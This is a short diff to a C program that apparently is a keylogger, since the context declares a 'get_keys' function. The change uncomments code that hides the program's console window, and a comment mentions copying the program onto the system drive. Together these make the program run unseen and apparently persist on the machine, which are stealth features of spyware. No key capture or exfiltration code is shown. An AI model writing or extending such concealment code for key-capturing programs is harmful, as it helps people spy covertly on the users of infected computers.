@@ -42,13 +42,13 @@ int get_keys(void);
 
 int main(void)
 {
-	/*
+	
 	//this is a WIN32 console application so I hid the cmd prompt.
 	HWND hidden;
 	AllocConsole();
 	hidden = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(hidden, 0);
-	*/
+	
 
 
 	//gets current directory and puts it into the systems drive
